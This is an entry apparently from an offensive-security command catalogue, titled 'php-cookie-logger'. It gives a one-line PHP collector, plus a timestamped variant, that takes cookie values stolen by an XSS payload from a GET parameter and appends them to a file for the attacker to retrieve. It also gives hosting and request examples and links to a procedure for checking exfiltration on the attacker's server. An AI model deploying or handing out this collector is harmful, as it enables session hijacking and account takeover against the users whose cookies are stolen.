---
data: >-
  <?php if(isset($_GET['c'])){file_put_contents("cookies.txt",$_GET['c'] . "\n",
  FILE_APPEND); } ?>
tags:
  - exfiltration
  - logging
type: command
output: null
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:30.674Z'
id: 428da878-1732-4419-9be3-aee785e7ca16
verified: false
validated: true
submitted: true
---
# php-cookie-logger

## Command

```php
<?php if(isset($_GET['c'])){file_put_contents("cookies.txt",$_GET['c'] . "\n", FILE_APPEND); } ?>
```

## Description

This PHP script receives a GET parameter 'c' containing stolen document.cookie values from the XSS payload and appends it to a cookies.txt file on the server for later retrieval by the attacker.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_GET['c']` | String containing the victim's cookie data | Yes |

## Examples

### Basic Usage

Host the script at an endpoint like https://example.com/logger.php. When accessed as `logger.php?c=CMSSESSIONID=abc123;other=cookie`, it logs the value.

### Advanced Usage

Add timestamp: `<?php if(isset($_GET['c'])){file_put_contents("cookies.txt", date('Y-m-d H:i:s') . ': ' . $_GET['c'] . "\n", FILE_APPEND); } ?>`

## Expected Output

Appends the cookie string followed by a newline to cookies.txt on the server. No direct output; check file for logged data.

## Related

- [[procedures/Verify-Cookie-Exfiltration-on-Attacker-Server]]
